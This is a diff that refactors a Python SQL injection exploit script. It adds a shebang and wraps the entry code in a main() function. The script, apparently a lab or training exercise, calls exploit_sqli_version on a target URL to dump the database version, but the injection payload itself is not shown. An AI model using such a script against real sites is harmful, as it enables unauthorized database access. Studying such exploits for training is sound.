@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import requests
 import sys
 import urllib3
@@ -21,7 +23,7 @@ def exploit_sqli_version(url):
         return True
     return False
 
-if __name__ == "__main__":
+def main():
     try:
         url = sys.argv[1].strip()
     except IndexError:
@@ -32,3 +34,7 @@ if __name__ == "__main__":
     print("[+] Dumping the version of the database...")
     if not exploit_sqli_version(url):
         print("[-] Unable to dump the database version.")
+
+
+if __name__ == "__main__":
+   main()
